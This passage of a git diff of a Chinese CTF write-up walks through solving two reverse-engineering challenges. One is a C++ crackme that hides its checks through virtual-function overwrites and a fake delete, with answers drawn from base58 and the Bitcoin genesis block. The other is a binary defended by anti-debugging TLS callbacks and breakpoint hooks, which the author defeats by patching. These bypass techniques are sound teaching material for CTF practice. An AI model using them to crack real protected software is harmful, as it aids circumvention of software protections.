 P->B    # t/
@@ -1474,36 +1682,50 @@ End        # Es
  
 
 ### 被隐藏的真实
+
 这题本来单纯地以为是很简单的题，听欧佳俊师傅讲了一下出题思路才发现他的想法真的比答题人多得多……
+
 main函数里调用了三次get_pwd()这个函数来check输入
+
 get_pwd中接受输入，然后对count自增，调用了Bitcoin对象的一个函数来校验输入
 
 ![](https://i.loli.net/2019/04/26/5cc2cfd1468bc.png)
 
 如果熟悉C++逆向的话，一眼就能看出来这是在调用虚函数
+
 因为v2是对象的空间，在C++的对象构造中，开头4个字节指向的是虚函数表
+
 v2指向的是虚函数表，*v2就是虚函数表的第一个函数了
 
 ![](https://i.loli.net/2019/04/26/5cc2cfdec47bd.png)
 
 （图片引自C++对象模型详解释https://www.cnblogs.com/tgycoder/p/5426628.html）
+
 做题的时候不是很熟悉C++的模型，以及虚函数反编译的不是很明显，直接动态调试做的。初始状态这个虚函数是init，其中调用了verify，第一次直接返回输入，对应输出列表的需求，要输入0xdeadbeef的小端序表示”efbeadde”。如果纯静态逆向，会继续往下看verify函数的第二、三次校验，但事实上第二次就没有调用init了。
+
 我在做的时候因为不熟悉虚函数，所以动态调试直接跟进函数，发现进入了sub_4046D7这个函数，其中的核心函数b58e乍看起来很复杂，但其实通过其中的24（实际上是256）、%58，和题目内的信息描述很容易想到比特币地址转换方法–base58
+
 直接进行解密获得bytes类型即可通关（注意最后4字节是sha256的验算字节，不可提交，否则会导致flag的sha256计算错误。因为第二关仅截取19个字符送入，但跟flag有关的sha256却会把所有input全部进行运算，导致最后提示Correct实际上的flag却不对）
+
 话是这么说，直接套来的脚本解密出来其实没看懂，还是自己查资料从加密到解密走了一趟才get到应该是hex格式。第三小关本来以为是脑洞题了，其实是误打误撞做出来的，运气是真的好OTZ
+
 这次虚函数又回到了verify，将Input进行两次sha256然后逆序与结果比较，当时的想法是结合提示语：
 
 ![](https://i.loli.net/2019/04/26/5cc2cfed5c268.png)
 
 查了一下发现这条地址是中本聪在开始比特币时记录的第一个块–创世块，刚开始想到的是根据创世块向区块链后端爆破，某个区块的sha将会满足要求。不过查了一下好像也没什么适合计算的，总不能自己重复一遍挖矿过程吧233
+
 卡了许久，代码中突然发现一个关键点
 
 ![](https://i.loli.net/2019/04/26/5cc2d000497b1.png)
 
 长度80是个很关键的提示！
+
 于是去找了区块链结构解析，发现区块头的长度正好是80个字节
 https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f.hex
+
 在这里得到了创世块的头部信息，提交即可获得flag
+
 事实上在经过家俊师傅的讲解后，再回头逆才发现这里的memcmp被覆盖到了sub_404A36函数
 
 ![](https://i.loli.net/2019/04/26/5cc2d00e50ed7.png)
@@ -1512,10 +1734,15 @@ https://webbtc.com/block/000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b
 ```
 IDC>auto i;for(i=0;i<80;i++){Message(“%02x”, Byte(0x6d0a00+i));}000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f4e61
 ```
+
 发现是创世块的哈希值，由此倒推出原输入是创世块。
+
 比赛的时候从一个长度猜到创世块头部，不得不感叹自己的运气真的是……
+
 最后再分析一下虚函数的覆盖，和家俊师傅挖下的种种坑
+
 首先注意到虚函数表中的第一个函数在初始情况下是Init
+
 逐步跟踪，发现Bitcoin在构造函数中就有玄机
 
 ![](https://i.loli.net/2019/04/26/5cc2d024ad640.png)
@@ -1525,38 +1752,57 @@ IDC>auto i;for(i=0;i<80;i++){Message(“%02x”, Byte(0x6d0a00+i));}000000000019
 ![](https://i.loli.net/2019/04/26/5cc2d02f81779.png)
 
 这时是直接一个leave和retn返回了
+
 但是后面有很多不可识别的脏数据，暂且先放着不管，继续往后走
+
 get_pwd函数中就如之前分析的一样，没什么问题
+
 问题在于析构函数里
 
 ![](https://i.loli.net/2019/04/26/5cc2d03a082d7.png)
 
 乍一看好像没什么问题哦，delete释放空间嘛
+
 注意这里的(this+3)指向的就是刚才跳转的0x6D0F88
+
 再点进delete内一看
 
 ![](https://i.loli.net/2019/04/26/5cc2d048d5648.png)
 
 ？！
+
 跟正常调用free的delete完全不一样，左边function列表中也竟然出现了两个同名的函数
+
 另外一个才是调用free的原delete，这个是冒牌的！
+
 这里利用的是IDA的重命名机制–C++编译器为了区分重载函数，会对函数生成一些其他字符来修饰。delete函数被修饰以后的名称是”_ZdaPv”，但是冒牌delete函数的原名是”__ZdaPv”，IDA同样也会将其重命名为delete，导致被忽视。
+
 这个delete中将参数指向的空间写为0x90，即NOP的机器码
+
 因此可以将刚才的leave、retn和大量脏数据全部写成NOP，从而使下一次调用构造函数的时候可以执行一些其他代码，而这个机密的函数就是脏数据之后的代码，sub_6D1048
 
 ![](https://i.loli.net/2019/04/26/5cc2d05310516.png)
 
 这里的a1是rbp，频繁调用的a1-8就是this指针
+
 可以看到，每次调用都会覆盖一次虚函数
+
 另外当第三次执行的时候会将memcmp重写
+
 整个理透以后这个题目学到的应该是最多的，各种阴险技术，真的很有意思23333
+
 可惜做的时候动态跟过去会忽视掉这里的大量重写，比较可惜
  
 ### 探寻逝去的Atlantis文明
+
 打开文件发现啥都没有
+
 运行杀毒软件提示有代码混淆器
+
 OD挂上各种报错，估计有反调
+
 于是从头分析，首先是两个TlsCallback
+
 TlsCallback_0中第一个函数sub_402B30动态获取了`ZwSetInformationThread`设置当前线程的信息
 ```
 v0 = GetModuleHandleA(&ModuleName);           // Ntdll
@@ -1569,39 +1815,63 @@ v0 = GetModuleHandleA(&ModuleName);           // Ntdll
 ![](https://i.loli.net/2019/04/26/5cc2d076ccd78.png)
 
 将其首字节改成0xc3，爆破掉即可
+
 后一个函数sub_4028F0同样也是动态获取了4个函数的地址，将它们保存在了一个函数表中留待日后取用。其中一个是IsDebuggerPresent这样的反调函数，另外三个则是VirtualAlloc、VirtualFree和Exit这种有用的函数，因此不可简单Patch
+
 再往后立即就调用了刚才的IsDebuggerPresent，判断到直接Exit
 
 ![](https://i.loli.net/2019/04/26/5cc2d081f17b5.png)
 
 这里Patch或者下断过都行，小问题
+
 TlsCallback_1里则是一个MessageBox，无关紧要
+
 接着进入main主函数
 
 ![](https://i.loli.net/2019/04/26/5cc2d08d6f3ce.png)
 
 那三个连续的函数不用在意，解密代码很复杂，无需关心
+
 sub_43180里是对Debug断点的Hook
+
 我们知道调试器下断的原理是将某个地址的机器码改为0xcc，使其触发异常，从而被调试器捕捉中断
+
 这个Hook会将0xcc改为0xc3，直接ret，导致不仅调试器捕捉不到断点，而且会直接令程序崩溃
+
 这个函数里除了Hook没有别的东西，直接Patch掉
+
 sub_403010里才是重头戏，通过memcpy将解密后的代码送入开辟出的空间中，然后直接调用
+
 几个函数通过F8步过函数可以大致猜测出功能
 
 ![](https://i.loli.net/2019/04/26/5cc2d09789094.png)
 
 关键在change_input和check两个函数中
+
 其实当把那几个反调试通过以后就问题就不大了
+
 动态调试跟进去，发现change_input中将Inputbase64后通过GlobalAddAtom将其加入了全局原子
+
 再往后跟的几个函数都格外的复杂，再加上代码是动态解密的，每次都需要自己MakeCode再F5才能浏览一遍猜测是否需要详细跟踪
+
 事实上在AddAtom之后虽然还有几个函数调用了Input的指针，但它们都是释放空间用的。
+
 这个AddAtom添加了一个全局可用的字符串，必然在某处调用了GlobalGetAtomName
+
 因此不妨稍微忽视一下其他函数，再往后跟
+
 果不其然在v19，即check中捕捉到了GlobalGetAtomName的调用
+
 该函数中生成了一个table，然后将table进行一顿操作后与Input逐字节异或，最后与另一个值进行比较—非常简单粗暴常见的逆向套路了
+
 可以通过dump将table得到，然后效仿操作与结果数组异或从而得到flag
+
 但更简单的方法当然是注意到这两点：
+
 异或的逆运算还是异或
+
 将table进行一顿操作与input完全无关
+
 因此将结果数组直接放入Input的地址中，等到比较的时候，该地址中就是我们需要input的值了
+
 解base64轻松得到flag。
